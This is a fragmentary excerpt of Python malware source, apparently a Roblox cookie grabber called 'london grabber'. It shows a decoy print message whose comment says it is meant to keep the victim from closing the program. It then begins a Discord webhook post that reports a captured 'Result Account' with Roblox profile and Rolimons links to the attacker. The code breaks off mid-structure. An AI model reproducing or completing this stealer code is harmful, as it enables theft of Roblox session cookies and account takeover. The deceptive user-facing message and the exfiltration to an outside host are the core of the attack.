...
dummy_message = "image logger loading" # A message that distracts the user from closing the grabber
print(dummy_message)
...
discord.post(
    username="BOT - london grabber 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/1014236005378834596/1035801443417993259/39e411a2853f981fa5884d34b6326d16-removebg-preview.png",
    embeds=[
        {
            "username": "BOT - london grabber 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/londonplayzlol/cookie-grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
